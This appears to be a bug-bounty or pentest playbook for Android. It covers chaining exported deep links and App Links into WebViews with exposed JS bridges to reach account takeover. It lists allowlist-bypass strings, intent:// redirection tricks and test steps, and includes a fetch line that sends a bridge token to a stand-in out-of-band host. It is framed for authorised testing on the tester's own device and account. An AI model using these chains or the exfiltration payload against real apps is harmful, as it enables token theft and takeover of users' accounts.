# Engine: Deep Link / App Link → WebView → JS Bridge → Sink (FLAGSHIP)

The canonical non-dup Android critical: an externally-reachable entry (deep link / App Link /
`intent://` URL) flowing into a WebView with weak navigation control and/or an exposed JS
bridge → JS execution, local-file read, token theft → **account takeover**, one click from a
web page. Scanners see "JS enabled"; you prove the whole chain.

## Preconditions (from model.md)
- Exported/BROWSABLE deep link or App Link (or an exported Activity that builds a WebView
  from intent data), AND any of:
  - `addJavascriptInterface` exposing methods,
  - `setAllowFileAccess(true)` / `setAllowUniversalAccessFromFileURLs(true)`,
  - missing/broken `shouldOverrideUrlLoading` allowlist,
  - `setWebContentsDebuggingEnabled(true)` (then `chrome://inspect` = full WebView control).

## The chain
1. **Entry** — attacker-controlled URI: `myapp://open?url=https://attacker.tld`,
   `https://app.example.com/open?url=...` (App Link), or a browser `intent://` URL. Delivery:
   web page (`<iframe src>`, `location=`), QR, NFC, another app's intent, Chrome `intent://`.
2. **Unvalidated forward** — `getQueryParameter("url")` → `webView.loadUrl(url)` with no
   allowlist → attacker page renders in the app's trusted WebView.
3. **Escalate inside the WebView**:
   - **JS bridge**: `window.<bridge>.getToken()` / `getUserInfo()` / `openFile()` → exfil.
     Enumerate methods: grep jadx for `@JavascriptInterface`; at runtime
     `frida_bridge_trace.js` auto-enumerates.
   - **Local file read**: `file:///data/data/<pkg>/shared_prefs/...` when
     `setAllowUniversalAccessFromFileURLs` (XHR from file origin) or `setAllowFileAccess` +
     predictable paths.
   - **Scheme smuggling**: `javascript:`, `content://provider/...`, `data:text/html,...`
     accepted by the navigation handler.
4. **Impact** — session token → ATO; sandbox file read; sensitive in-app action via bridge or
   app routes (transfer, email change).

## Allowlist-bypass corpus (the non-dup details)
When `shouldOverrideUrlLoading`/routing validates, attack the validator:
- `endsWith("example.com")` → `attacker-example.com`, `example.com.attacker.com`,
  `https://example.com@attacker.tld/`.
- `host.contains("example")` → `example.attacker.tld`.
- `Uri.getHost()` quirks: userinfo `@`, `#` fragment confusion, backslash `\/`, trailing dot
  `example.com.`, case, percent-encoding `%65xample.com`, double-encoding, unicode/IDN
  homographs, empty host after `://@`.
- Redirect chains: allowlisted start URL → server 302 / `window.location` / meta refresh to
  attacker (does the client re-check on every navigation?).
- Open redirect on a real subdomain → allowlist passes → lands on attacker page.
- `data:`/`blob:` base-url inheritance for script execution context.

## High-value variants
- **App Link hijack via subdomain takeover**: every host in an `autoVerify` filter must serve
  valid `assetlinks.json`; a takable subdomain listed there → verified hijack, no dialog.
- **Filter with scheme but no host** (`<data android:scheme="https"/>`) → app offers to open
  ALL https links → phishing/hijack surface.
- **Token-leaking deep link**: app *emits* a link carrying a token (OAuth callback
  `myapp://callback?code=`); a malicious app registering the same scheme intercepts it
  (custom schemes are first-come). Universal-Link equivalent on Android = App Links +
  assetlinks; its absence on an auth callback is the bug.
- **`intent://` redirection**: browser page uses `intent://...#Intent;component=<pkg>/.internal.Activity;end`
  or `S.<extra>` string extras → reaches non-exported components via the browser's
  `startActivity` (parse with `Intent.parseUri` — check `selector`/`component` handling).
- **WebView OAuth**: login inside WebView → token visible to app/JS; `shouldInterceptRequest`
  credential skimming.
- **Cache/cookie theft**: `CookieManager` third-party cookies, predictable cache paths,
  `setWebContentsDebuggingEnabled(true)` in release builds.

## Test & confirm (your own device/emulator)
```
scripts/deeplink_probe.sh android <pkg> 'myapp://open?url=https://YOUR-OOB/poc.html'
# or prove browser reachability: host <a href="..."> / intent:// URL, tap from Chrome
```
Serve a PoC page that calls the bridge and exfils to YOUR OOB:
`fetch('https://YOUR-OOB/leak?d='+encodeURIComponent(window.bridge.getToken()))`.
Capture = proof (your own account's token only). Hook with `frida_bridge_trace.js` to confirm
reachability/arguments when the flow is obscured. Sweep the full matrix with the generated
`deeplink_fuzz.sh` in a background task; watch logcat + OOB.

## Proof bar & reporting
Show: exact externally-triggerable link, the unvalidated forward (cite class/method), attacker
page, captured token/file at your OOB (own account). Map **MASVS-PLATFORM** (+MASVS-AUTH on
ATO). Severity typically High–Critical (one-click ATO). Rarely dup: it depends on *this app's*
routing + bridge — describe the full chain.
